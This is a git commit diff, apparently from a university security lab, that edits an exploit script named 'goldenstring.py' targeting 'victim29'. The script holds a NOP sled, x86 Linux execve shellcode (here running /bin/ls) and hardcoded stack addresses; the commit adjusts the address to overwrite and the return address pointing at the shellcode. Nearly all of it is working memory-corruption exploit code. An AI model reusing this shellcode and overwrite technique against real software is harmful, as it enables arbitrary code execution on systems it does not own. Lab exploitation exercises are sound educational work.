1a7a9e2bae56bf1d50aa57b4ceed503f8859a514
Stephen Dean <kdt298@my.utsa.edu>
2022-10-20 15:18:40 -0500

    fdfs

--- victim29/goldenstring.py
+++ victim29/goldenstring.py
@@ -3,9 +3,9 @@ import os
 NOPSLED = b'\x90' * 0x300
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
 
-ADDRESSTOWRITE = b'BFFFE57C'
+ADDRESSTOWRITE = b'BFFFE58C'
 i = 1
-ADDRESSOFSHELL = b'\xBF\xFF\xEF\x68'
+ADDRESSOFSHELL = b'\xBF\xFF\xEF\xC8'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
